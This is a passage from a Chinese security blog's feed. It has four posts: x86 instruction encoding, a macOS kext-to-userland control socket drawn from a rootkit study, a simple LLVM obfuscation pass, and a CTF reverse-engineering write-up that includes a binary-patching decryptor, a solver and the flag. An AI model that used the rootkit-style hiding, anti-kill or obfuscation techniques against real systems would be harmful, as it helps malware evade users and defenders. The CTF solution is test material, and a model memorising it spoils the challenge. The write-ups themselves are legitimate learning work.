,这种内存寻址是base+index</em>scale+disp。这需要SIB字节来进行确定，那么ModRM必须要有一个手段来引出后续的SIB字节。在 [rax] ~ [rdi] 的范围里，Intel选择了原来应属于 [rsp] 的值用来引出SIB，一是因为 [rsp] 并不常用吧。二是因为 rsp 设计为 stack top指针，专用于stack top指针。<br>　　原来属于 [rsp] 的领域对应的，r/m是100，这个领域被 [SIB] 替代了，事实上在16位机器原本是没有SIB字节的，base+index*scale+disp这种寻址是后来才增加的。16位的ModRM上是没有SIB引导域。</p><p>(2)如果内存寻址中没有base和index，只有disp的话，如：mov ebx, [0x11223344]，这种直接寻址方式，在设计上ModRM还必须为提供这个模式。<br>　　Intel又作出修改，选择了原来属于 [rbp] 模式的领域提供给 [disp]，选择 [rbp] 让给 [disp]，是因为 rbp 原本意图就是设计为 stack基址指针。[rbp] 寻址一般都要加上一个偏移量，也就是基于stack frame指针的偏移量，即 [ebp + disp] 这种寻址模式在 mod = 01 或 mod = 10 中给出。</p></blockquote><h3 id="SIB"><a href="#SIB" class="headerlink" title="SIB"></a>SIB</h3><p>SIB意即：Scale – Index – Base，用来定义base+index*scale+disp这种寻址模式。同样按2-3-3比例组合。</p><table><thead><tr><th>7-6</th><th>5-4-3</th><th>2-1-0</th></tr></thead><tbody><tr><td>scale</td><td>index</td><td>base</td></tr></tbody></table><p>index 域指出index寄存器的ID值，范围从 000 ~ 111。base 域指出base寄存器的ID 值，从 000 ~ 111。Index与base经过 REX prefix可以扩展为0000 ~ 1111。</p><h3 id="Displacement-和-Immediate"><a href="#Displacement-和-Immediate" class="headerlink" title="Displacement 和 Immediate"></a>Displacement 和 Immediate</h3><p>某些指令会在最后要求有一个用于计算内存地址的值，或者一个立即数。很明显，不多说。</p><h3 id="综合起来，看下面的例子："><a href="#综合起来，看下面的例子：" class="headerlink" title="综合起来，看下面的例子："></a>综合起来，看下面的例子：</h3><ul><li><p><code>49 8b 7d 00</code></p><p>49=0100 1001对应REX prefix,默认64为size模式</p><p>8b= mov opcode</p><p>7d=01 111 101—&gt;ModR/M   mod = 01，定义 [register + disp8]，有8位displacemnet 偏移值。rdi ,r13</p><p>00=Displacement = 0</p><p>所以指令= mov rdi,QWORD PTR [r13+0]—&gt;mov rdi,[r13]</p><p>​</p></li></ul><h3 id="参考及索引"><a href="#参考及索引" class="headerlink" title="参考及索引"></a>参考及索引</h3><p><a href="http://ref.x86asm.net/coder32.html" target="_blank" rel="external">http://ref.x86asm.net/coder32.html </a>—-&gt; 查阅opcode</p><p><a href="http://pnx.tf/files/x86_opcode_structure_and_instruction_overview.png" target="_blank" rel="external">http://pnx.tf/files/x86_opcode_structure_and_instruction_overview.png</a> —&gt;quick look</p><p><a href="http://sparksandflames.com/files/x86InstructionChart.html" target="_blank" rel="external">Intel x86 Assembler Instruction Set Opcode Table</a></p><p><a href="http://www.mouseos.com/x64/index.html" target="_blank" rel="external">http://www.mouseos.com/x64/index.html</a></p><p><a href="https://bbs.pediy.com/thread-78121.htm" target="_blank" rel="external">https://bbs.pediy.com/thread-78121.htm</a></p><p><a href="http://ytliu.info/blog/2016/12/10/x86zhi-ling-bian-ma-de-na-xie-shi-er/" target="_blank" rel="external">X86指令编码的那些事儿</a></p><p><a href="http://subler.github.io/note/compiler/x86_instruction_encode.html" target="_blank" rel="external">http://subler.github.io/note/compiler/x86_instruction_encode.html</a></p><p><a href="https://www.onlinedisassembler.com/odaweb/strcpy_x86" target="_blank" rel="external">onlineDisassembler</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;由于重装系统同步导致原文章消失，只能再写一遍，方便以后查阅。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;x86指令编码格式&quot;&gt;&lt;a href=&quot;#x86指令编码格式&quot; class=&quot;headerlink&quot; title=&quot;x86指令编码格式
      
    
    </summary>
    
      <category term="misc" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/misc/"/>
    
    
      <category term="x86" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/x86/"/>
    
  </entry>
  
  <entry>
    <title>一种用户层与kext内核扩展交互方式</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2017/08/10/%E4%B8%80%E7%A7%8D%E7%94%A8%E6%88%B7%E5%B1%82%E4%B8%8Ekext%E5%86%85%E6%A0%B8%E6%89%A9%E5%B1%95%E4%BA%A4%E4%BA%92%E6%96%B9%E5%BC%8F/%E4%B8%80%E7%A7%8D%E7%94%A8%E6%88%B7%E5%B1%82%E4%B8%8Ekext%E5%86%85%E6%A0%B8%E6%89%A9%E5%B1%95%E4%BA%A4%E4%BA%92%E6%96%B9%E5%BC%8F/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2017/08/10/一种用户层与kext内核扩展交互方式/一种用户层与kext内核扩展交互方式/</id>
    <published>2017-08-10T07:59:00.000Z</published>
    <updated>2017-08-10T10:34:57.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><blockquote><p>最近在学习一个Mac平台上开源的rootKit框架，里面确实有很多干货，本文就来分析其中与用户层交互的部分。<br>简单说下rootKit原理：<br>利用kext驻留在内核，完成实际的各种功能：<br><code>sys_ptrace</code>过滤 <code>PT_DENY_ATTACH</code>反调试<br>hook系统调用防止<code>sys_kil</code>（很强大有木有）<br>隐藏自身进程，文件监控，网络监控，提权等等<br>可谓是相当可怕。这些功能都可以通过一个用户进程来控制，所以这里必须有一种机制来提供kext与用户层的交互方式，这就是本文重点。</p></blockquote></blockquote><h3 id="0x01-一个例子进入kext开发"><a href="#0x01-一个例子进入kext开发" class="headerlink" title="0x01 一个例子进入kext开发"></a>0x01 一个例子进入kext开发</h3><p>在这之前，简单的用一个例子来学习下kext开发。下面关于xcode中的操作都很明显，故忽略。</p><p>打开xcode创建一个Generic Kernel Extension工程，完成之后会出现一个kext模板，如下</p><pre><code>#include &lt;mach/mach_types.h&gt;#include &lt;libkern/libkern.h&gt;kern_return_t TestExtension_stop(kmod_info_t *ki, void *d);kern_return_t TestExtension_start(kmod_info_t * ki, void *d){    printf(&quot;hello kext!\n&quot;);    return KERN_SUCCESS;}kern_return_t TestExtension_stop(kmod_info_t *ki, void *d){    printf(&quot;bye kext!\n&quot;);    return KERN_SUCCESS;}</code></pre><p>其中这两个函数分别在内核扩展加载和卸载时调用，比如上面我们只是打印一行hello kext，这句话就会在这个kext加载是打印出来（在系统日志中查看）你可能会有疑惑，系统如何知道是这两个函数的，这个是在工程中设置的，你可以改变成任何函数都是OK的。</p><p>简单编译一下，然后找到编译后的kext文件，输入命令改变权限</p><p><code>sudo chown -R root:wheel TestExtension.kext</code></p><p>再输入  </p><p><code>sudo kextload TestExtension.kext</code></p><p>加载内核扩展，如果一切没错的话，这时你在系统日志中就会出现hello kext这句话。同理你可以输入下面的命令</p><p><code>sudo kextunload TestExtension.kext</code></p><p>来卸载该内核扩展，你同样会看到bye kext这句话。</p><h3 id="0x02-用户层与内和扩展间的交互"><a href="#0x02-用户层与内和扩展间的交互" class="headerlink" title="0x02 用户层与内和扩展间的交互"></a>0x02 用户层与内和扩展间的交互</h3><p>下面要介绍的是一种类似于socket机制的交互机制，通常kext在加载的时候会建立一个socket服务器，然后用户层程序去打开这个socket（使用<code>PF_SYSTEM</code>协议）。接下来kext就会处理来至用户端的命令。下面同样通过一个例子来表明他们之间的交互，这里分为kext和客户端两部分。</p><h4 id="kext-示例代码"><a href="#kext-示例代码" class="headerlink" title="kext 示例代码"></a>kext 示例代码</h4><pre><code>#include &lt;sys/systm.h&gt;#include &lt;mach/mach_types.h&gt;#include &lt;mach/kern_return.h&gt; #include &lt;sys/kern_control.h&gt;//#include &lt;SOMEWHERE YOU CAN GET STRNCPY IN THE KERNEL FROM&gt;char name[] = &quot;com.example.mymodule&quot; ;//标识这个kextstruct kern_ctl_ref _ctlref ; kern_return_t start(kmod_info_t *info, void *data){    int err ;    struct kern_ctl_reg ctlreg ;    bzero(&amp;ctlreg, sizeof(ctlreg)) ;    //控制信息    ctlreg.ctl_id = 0 ; /* 请求分配一个动态id */    ctlreg.ctl_unit = 0 ;    strncpy(ctlreg.ctl_name, name, sizeof(ctlreg.ctl_name));    //回调函数    ctlreg.ctl_connect_func = connect ;    ctlreg.ctl_disconnect_func = disconnect ;    ctlreg.ctl_send_func = send ;    ctlreg.ctl_getopt_func = getopt ;    ctlreg.ctl_setopt_func = setopt ;    //注册内核控制    err = ctl_register(&amp;ctlreg, &amp;_ctlref) ;    if (err) return KERN_FAILURE ;    return KERN_SUCCESS ;}</code></pre><p>下面解释下其中的<code>kern_ctl_ref</code>数据结构</p><pre><code>struct kern_ctl_reg{    /* 控制信息 */    char        ctl_name[MAX_KCTL_NAME];    u_int32_t    ctl_id;    u_int32_t    ctl_unit;    /* 控制设置 */    u_int32_t    ctl_flags;    u_int32_t    ctl_sendsize;    u_int32_t    ctl_recvsize;    /* 回调函数 */    ctl_connect_func    ctl_connect;//建立连接时调用    ctl_disconnect_func    ctl_disconnect;//断开连接时调用    ctl_send_func    ctl_send;//处理从client到kernel的数据发送    ctl_setopt_func    ctl_setopt; //当client调用setsockopt时调用    ctl_getopt_func    ctl_getopt;//当client调用getsockopt时调用};</code></pre><h4 id="client-示例代码"><a href="#client-示例代码" class="headerlink" title="client 示例代码"></a>client 示例代码</h4><pre><code>#include &lt;socket.h&gt;#include &lt;string.h&gt;#include &lt;sys/kern_control.h&gt;#include &lt;sys/ioctl.h&gt;char name[] = &quot;com.example.mymodule&quot; ;//标识这个kextstatic int g_socket = -1;u_int32_t getctlidbybame(int sock, char *name) ;//建立连接int socket_ctl(char *name){    int g_sock = socket(PF_SYSTEM, SOCK_DGRAM, SYSPROTO_CONTROL) ;    if (g_sock == 0) return 0 ;    u_int32_t id = getctlidbyname(g_sock, name) ;    sockaddr_ctl addr ;    addr.sc_len = sizeof(addr) ;    addr.sc_family = AF_SYSTEM ;    addr.sc_sysaddr = AF_SYS_CONTROL ;    addr.sc_id = id ;    addr.sc_unit = 0 ; /* allocate dynamically */    int err ;    err = connect(g_sock, (struct sockaddr*)&amp;addr, sizeof(addr)) ;    if (err) return 0 ;    return sock ;}u_int32_t getctlidbybame(int sock, char *name){    struct ctl_info info ;    memset(&amp;info, 0, sizeof(info)) ;    strncpy(info.ctl_name, name, strlen(name)) ;    int err = ioctl(sock, CTLIOCGINGO, &amp;info) ;    if (err) return 0 ; /* should do something stronger here! */    return info.ctl_id ;}int main(int argc, const char *argv[]){        socket_ctl(name);}//发送数据void execute_cmd(int cmd, char *args){    char data[32] = { 0 };    size_t data_len = 0;    int retv;    if(args != NULL) {        memcpy(data, args, strlen(args));    }    data_len = strlen(data) + 1;    retv = setsockopt(g_socket, SYSPROTO_CONTROL, cmd, (void *)data, (socklen_t)data_len);    if(retv != 0) {        printf(&quot;[ERROR] Kernel command execution failed:\n&quot;);        printf(&quot;\t%s (%d)\n&quot;, strerror(errno), errno);        return;    }}//接收数据void get_data(){    char *data = malloc(32);    socklen_t data_len = 32;    int retv = getsockopt(g_socket, SYSPROTO_CONTROL, 0, data, &amp;data_len);    if(retv != 0) {        printf(&quot;[ERROR] getsockopt()\n&quot;);        return;    }    size_t r = recv(g_socket, data, data_len, 0);    if(r == 0) {        printf(&quot;[ERROR] recv()\n&quot;);        return;    }}</code></pre><p>代码不是很复杂，先通过kext名去获取一个id建立一个socket，然后通过这个socket去发送和接受kext的数据。</p><h3 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h3><p>在这个rootKit框架中还有很多可以挖掘的东西，里面hook系统调用来达到反kill等功能很是实用，以及一些内核操作手段都值得学习和借鉴，待续…</p><h3 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h3><ul><li><a href="http://www.tanhao.me/pieces/1515.html/" target="_blank" rel="external">http://www.tanhao.me/pieces/1515.html/</a></li><li><a href="https://urchin.earth.li/~twic/Kernel_Extensions_for_OS_X.html" target="_blank" rel="external">https://urchin.earth.li/~twic/Kernel_Extensions_for_OS_X.html</a></li><li><a href="https://github.com/enzolovesbacon/inficere">https://github.com/enzolovesbacon/inficere</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;最近在学习一个Mac平台上开源的rootKit框架，里面确实有很多干货，本文就来分析其中与用户层交互的部分。&lt;br&gt;简单说下rootKit原理：&lt;br&gt;利用kext驻留在内核，完成实际的各种功能：&lt;br&gt;&lt;code&gt;sys
      
    
    </summary>
    
      <category term="kext/iokit" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/kext-iokit/"/>
    
    
      <category term="kext" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/kext/"/>
    
  </entry>
  
  <entry>
    <title>初-LLVM的代码混淆</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2017/06/25/%E5%88%9D-LLVM%E7%9A%84%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86/%E5%88%9D-LLVM%E7%9A%84%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2017/06/25/初-LLVM的代码混淆/初-LLVM的代码混淆/</id>
    <published>2017-06-25T07:09:13.000Z</published>
    <updated>2019-02-21T09:55:50.563Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-目录"><a href="#0x00-目录" class="headerlink" title="0x00 目录"></a>0x00 目录</h2><blockquote><blockquote><p>断断续续的学习了一段时间的LLVM，记录下学习进度，随着后面的学习待更新</p></blockquote></blockquote><ul><li>LLVM简介</li><li>一个基于LLVM简单的代码混淆例子</li><li>参考链接</li></ul><h2 id="0x01-LLVM简介"><a href="#0x01-LLVM简介" class="headerlink" title="0x01 LLVM简介"></a>0x01 LLVM简介</h2><p>LLVM(low level virtual machine)是一个先进的编译器框架，它提供了一种代码编写良好的中间表示(IR)，可以作为多种语言的后端，还可以提供与变成语言无关的优化和针对多种cpu的代码生成功能。<br>LLVM的主要架构如下：</p><ul><li>前端：前端用来获取源代码然后将它转变为某种中间表示，我们可以选择不同的编译器来作为LLVM的前端，如gcc，clang。</li><li>Pass：Pass是LLVM优化工作的一个节点，一个节点做些事，一起加起来就构成了LLVM完整的优化和转化。</li><li>后端：后端用来生成实际的机器码，一般情况下不会关注这一部分。</li></ul><h3 id="LLVM框架："><a href="#LLVM框架：" class="headerlink" title="LLVM框架："></a>LLVM框架：</h3><p><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/LLVM/0-0.png?raw=true" alt="0-0"><br>这里与传统的编译器不同，LLVM采用了一种统一的中间表示：<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/LLVM/0-1.png?raw=true" alt="0-1"></p><h3 id="安装与使用"><a href="#安装与使用" class="headerlink" title="安装与使用"></a>安装与使用</h3><p>首先下载LLVM  </p><pre><code>$ cd where-you-want-llvm-to-live$ svn co http://llvm.org/svn/llvm-project/llvm/trunk llvm</code></pre><p>我们选择clang作为LLVM前端，然后下载clang  </p><pre><code>$ cd where-you-want-llvm-to-live$ cd llvm/tools$ svn co http://llvm.org/svn/llvm-project/cfe/trunk clang</code></pre><p>下载编译运行库</p><pre><code>$ cd where-you-want-llvm-to-live$ cd llvm/projects$ svn co http://llvm.org/svn/llvm-project/compiler-rt/trunk compiler-rt</code></pre><p>最后编译LLVM源码</p><pre><code>$ mkdir build$ cd build$ cmake -DCMAKE_BUILD_TYPE:String=Release ../llvm/$ make</code></pre><p>编译时间可能有点长，编译完成之后进行安装</p><pre><code>$sudo make install</code></pre><p>接下来就是LLVM的使用，先创建一个hello.c源文件</p><pre><code>#include &lt;stdio.h&gt;int main(){    printf(&quot;hello LLVM\n&quot;);    return 0;}</code></pre><h2 id="0x02-一个基于LLVM简单的代码混淆例子"><a href="#0x02-一个基于LLVM简单的代码混淆例子" class="headerlink" title="0x02 一个基于LLVM简单的代码混淆例子"></a>0x02 一个基于LLVM简单的代码混淆例子</h2><p>Pass是LLVM中一个很重要的部分，每个Pass都是做优化或者转换的工作，LLVM的优化和转换工作就是由很多个Pass一起完成的。我们通过继承指定的类以及实现相关的虚函数来实现具体的Pass，具体的类型主要有以下几种：  </p><ul><li>ImmutablePass</li><li>MoudlePass</li><li>CallGraphSCCPass</li><li>FuncationPass</li><li>LoopPass</li><li>RegionPass</li><li>BasicBlockPass</li><li>MachineFunctionPass</li></ul><p>下面这个例子来介绍一下pass的编写并达到简单的混淆。从这里下载这个模板<a href="https://github.com/NULL-ME/NULL-ME.github.io/tree/master/articlePic/LLVM/skeleton">llvm-pass-skeleton</a></p><p>下面是完整代码：</p><pre><code>#include &quot;llvm/Pass.h&quot;#include &quot;llvm/IR/Function.h&quot;#include &quot;llvm/Support/raw_ostream.h&quot;#include &quot;llvm/IR/LegacyPassManager.h&quot;#include &quot;llvm/Transforms/IPO/PassManagerBuilder.h&quot;#include &quot;llvm/IR/Intrinsics.h&quot;#include &quot;llvm/IR/Instructions.h&quot;using namespace llvm;namespace {  struct SkeletonPass : public FunctionPass {    static char ID;    SkeletonPass() : FunctionPass(ID) {}    // virtual bool runOnFunction(Function &amp;F) {    //   errs() &lt;&lt; &quot;I saw a function called &quot; &lt;&lt; F.getName() &lt;&lt; &quot;!\n&quot;;    //   return false;    // }    bool runOnFunction(Function &amp;F) override {            Function *tmp = &amp;F;            // 遍历函数中的所有基本块            for (Function::iterator bb = tmp-&gt;begin(); bb != tmp-&gt;end(); ++bb) {                // 遍历基本块中的每条指令                for (BasicBlock::iterator inst = bb-&gt;begin(); inst != bb-&gt;end(); ++inst) {                    // 是否是add指令                    if (inst-&gt;isBinaryOp()) {                        if (inst-&gt;getOpcode() == Instruction::Add) {                            ob_add(cast&lt;BinaryOperator&gt;(inst));                        }                    }                }            }            return false;        }        // a+b === a-(-b)        bool ob_add(BinaryOperator *bo) {            BinaryOperator *op = NULL;            if (bo-&gt;getOpcode() == Instruction::Add) {                // 生成 (－b)                op = BinaryOperator::CreateNeg(bo-&gt;getOperand(1), &quot;&quot;, bo);                // 生成 a-(-b)                op = BinaryOperator::Create(Instruction::Sub, bo-&gt;getOperand(0), op, &quot;&quot;, bo);                op-&gt;setHasNoSignedWrap(bo-&gt;hasNoSignedWrap());                op-&gt;setHasNoUnsignedWrap(bo-&gt;hasNoUnsignedWrap());            }            // 替换所有出现该指令的地方            bo-&gt;replaceAllUsesWith(op);        }  };}char SkeletonPass::ID = 0;// Automatically enable the pass.// http://adriansampson.net/blog/clangpass.htmlstatic void registerSkeletonPass(const PassManagerBuilder &amp;,                         legacy::PassManagerBase &amp;PM) {  PM.add(new SkeletonPass());}static RegisterStandardPasses  RegisterMyPass(PassManagerBuilder::EP_EarlyAsPossible,                 registerSkeletonPass);</code></pre><p>通过继承<code>FunctionPass</code>重写虚函数<code>runOnFunction</code>来到达我们代码混淆的目的，再看关键的混淆部分，如下面注释那样，找到函数中的add指令，并将其改为sub指令。如<code>a+b</code>经过混淆为<code>a-(-b)</code></p><pre><code>bool runOnFunction(Function &amp;F) override {            Function *tmp = &amp;F;            // 遍历函数中的所有基本块            for (Function::iterator bb = tmp-&gt;begin(); bb != tmp-&gt;end(); ++bb) {                // 遍历基本块中的每条指令                for (BasicBlock::iterator inst = bb-&gt;begin(); inst != bb-&gt;end(); ++inst) {                    // 是否是add指令                    if (inst-&gt;isBinaryOp()) {                        if (inst-&gt;getOpcode() == Instruction::Add) {                            ob_add(cast&lt;BinaryOperator&gt;(inst));                        }                    }                }            }            return false;        }</code></pre><p>代码很简单，这里就不多说。我们使用</p><pre><code>$clang -Xclang -load -Xclang build/skeleton/libSkeletonPass.* something.c</code></pre><p>来运行这个pass编译成目标可执行文件<br>现在我们创建一个addTest.c文件来测试是否代码混淆</p><pre><code>#include &lt;stdio.h&gt;int func(int a,int b){    return a + b;}int main(){    int c;    c = func(6,9);    printf(&quot;%d\n&quot;,c);    return c;}</code></pre><p>先按照一般的编译源代码，查看关键汇编代码：<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/LLVM/0-2.png?raw=true" alt="0-2"><br>然后运行我们的pass进行编译<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/LLVM/0-3.png?raw=true" alt="0-3"><br>很明显，汇编代码发生了改变，当然这里仅仅是一个简单的混淆，感兴趣的可以研究下<a href="https://github.com/obfuscator-llvm">obfuscator-llvm</a>这个项目。</p><h2 id="0x03-参考链接"><a href="#0x03-参考链接" class="headerlink" title="0x03 参考链接"></a>0x03 参考链接</h2><p><a href="http://www.tuicool.com/articles/2meqIjq" target="_blank" rel="external">深入剖析 iOS 编译 Clang / LLVM</a><br><a href="http://zke1ev3n.me/2016/01/18/%E5%9F%BA%E4%BA%8ELLVM%E7%9A%84%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86/" target="_blank" rel="external">http://zke1ev3n.me/2016/01/18/%E5%9F%BA%E4%BA%8ELLVM%E7%9A%84%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-目录&quot;&gt;&lt;a href=&quot;#0x00-目录&quot; class=&quot;headerlink&quot; title=&quot;0x00 目录&quot;&gt;&lt;/a&gt;0x00 目录&lt;/h2&gt;&lt;blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;断断续续的学习了一段时间的LLVM，记录下学习进
      
    
    </summary>
    
      <category term="LLVM" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/LLVM/"/>
    
    
      <category term="LLVM" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/LLVM/"/>
    
      <category term="obfuscation" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/obfuscation/"/>
    
  </entry>
  
  <entry>
    <title>pwnhub-CTF re150</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2017/05/28/pwnhub-CTF-re150/pwnhub-CTF-re150/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2017/05/28/pwnhub-CTF-re150/pwnhub-CTF-re150/</id>
    <published>2017-05-28T01:16:13.000Z</published>
    <updated>2019-02-21T10:03:11.419Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-写在前面"><a href="#0x00-写在前面" class="headerlink" title="0x00 写在前面"></a>0x00 写在前面</h2><p>第一次做pwnhub题，最近参加了几场ctf比赛，pwnhub的题还是比较有一定难度的，这里记录下其中的一道逆向题。题目在<a href="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/pwnhub-CTF-re150/re150?raw=true">这里</a></p><h2 id="0x01-简单分析"><a href="#0x01-简单分析" class="headerlink" title="0x01 简单分析"></a>0x01 简单分析</h2><p>拿到题目后试着在虚拟机里运行了一下，看下有什么提示<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/pwnhub-CTF-re150/0-0.png?raw=true" alt="0-0"></p><p>然后转去hopper搜下相关字符串，并没有发现<code>error</code>相关字符串，syclover也没有相关<code>printf</code>等函数输出，看来只能上gdb调试看看。</p><p>发现程序里面有多处花指令以及隐藏了程序入口。<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/pwnhub-CTF-re150/0-1.png?raw=true" alt="0-0"></p><p>由上图可以发现syclover直接由<code>int 0x80</code>系统调用中断输出到屏幕，下面是一个循环解密，后面可知解密的正是程序的入口。</p><p>由<code>__libc_start_main</code>函数可得第一个参数即为<code>main</code>函数地址<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/pwnhub-CTF-re150/0-2.png?raw=true" alt="0-0"><br>这里作为对比，可以看下hopper中对<code>0x8048320</code>main函数的解析<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/pwnhub-CTF-re150/0-3.png?raw=true" alt="0-0"><br>完全不知道是什么有木有？所以拿到题如果放到IDA之类的反汇编工具根本看不出什么线索</p><p>接下来所做的事就是获取输入的字符串然后进行加密，然后与程序里的字符串加密比较，具体看后面的代码。</p><h2 id="0x02-修复程序"><a href="#0x02-修复程序" class="headerlink" title="0x02 修复程序"></a>0x02 修复程序</h2><p>根据上面的分析，我们将程序进行修复</p><pre><code>#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;fcntl.h&gt;#include &lt;unistd.h&gt;#include &lt;assert.h&gt;#include &lt;elf.h&gt;#define ENTRY 0x08048320#define FILE_OFF 0x320#define COUNT 0x432int main(int argc,char *argv[]){    Elf32_Ehdr ehdr;    unsigned char buf[COUNT] = {0};    assert(argc == 2);    int fd = open(argv[1],O_RDWR);//打开文件    assert(fd&gt;0);    assert(lseek(fd,0,SEEK_SET)!=-1);// 读取elf头    assert(read(fd,&amp;ehdr,sizeof(ehdr)) == sizeof(ehdr));     ehdr.e_entry = ENTRY;//修改入口地址      assert(lseek(fd,0,SEEK_SET)!=-1);//回写elf头    assert(write(fd,&amp;ehdr,sizeof(ehdr)) == sizeof(ehdr));      //解密    assert(lseek(fd,FILE_OFF,SEEK_SET)!=-1);//读取被加密的代码    assert(read(fd,buf,COUNT) == COUNT);    int i = 0;    while(i&lt;COUNT){        buf[i] = (buf[i]^66)&lt;&lt;5 | (buf[i]^66)&gt;&gt;3;         i++;         }    assert(lseek(fd,FILE_OFF,SEEK_SET)!=-1);//写入正确代码    assert(write(fd,buf,COUNT) == COUNT);</code></pre><h2 id="0x03-分析算法计算flag"><a href="#0x03-分析算法计算flag" class="headerlink" title="0x03 分析算法计算flag"></a>0x03 分析算法计算flag</h2><pre><code>#!/usr/bin/python# -*- coding: UTF-8 -*-from __future__ import print_function  import sysdef getflag():    print(&quot;[i]start to encrypt key&quot;)    key = [0x73,0x8d,0xf2,0x4c,0xc7,0xd4,0x7b,0xf7,0x18,0x32,0x71,0x0d,0xcf,0xdc,0x67,0x4f,0x7f,0x0b,0x6d]    encryptKey = []    print(&quot;encryptKey=[&quot;, end=&quot;&quot;)    for idx in range(len(key)):        encryptKey.append(key[idx] ^ 0x20)        print(&quot;%x &quot; % encryptKey[idx], end=&quot;&quot;)    print(&quot;]&quot;)      flag = []    print(&quot;[i]find the flag&quot;)    for i in range(len(encryptKey)):        count = 0x00        while(count &lt;= 0x7f):            one = count &gt;&gt; (((0 &gt;&gt; 0x1d) + i) &amp; 0x7 - (0 &gt;&gt; 0x1d))            two = count &lt;&lt; (0x8 - (((0 &gt;&gt; 0x1d) + i) &amp; 0x7 - (0 &gt;&gt; 0x1d)))            if((((one | two) ^ i) &amp; 0xff) == encryptKey[i]):                flag.append(count)                break            count = count + 1    print(&quot;flag = &quot;,end=&quot;&quot;)    for i in range(len(flag)):        print(&quot;%c&quot; % flag[i], end=&quot;&quot;)   if __name__ == &#39;__main__&#39;:    key = getflag()</code></pre><p>最后运行程序得到flag</p><pre><code>[i]start to encrypt keyencryptKey=[53 ad d2 6c e7 f4 5b d7 38 12 51 2d ef fc 47 6f 5f 2b 4d ][i]find the flagflag = SYC{&gt;&gt;Wh06m1&gt;&gt;R0Ot}</code></pre><p>测试：<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/pwnhub-CTF-re150/0-4.png?raw=true" alt="0-0"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-写在前面&quot;&gt;&lt;a href=&quot;#0x00-写在前面&quot; class=&quot;headerlink&quot; title=&quot;0x00 写在前面&quot;&gt;&lt;/a&gt;0x00 写在前面&lt;/h2&gt;&lt;p&gt;第一次做pwnhub题，最近参加了几场ctf比赛，pwnhub的题还是比较有一定难度
      
    
    </summary>
    
      <category term="CTF" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/CTF/"/>
    
    
      <category term="CTF" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/CTF/"/>
    
      <category term="writeup" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/writeup/"/>
    
  </entry>
  
</feed>
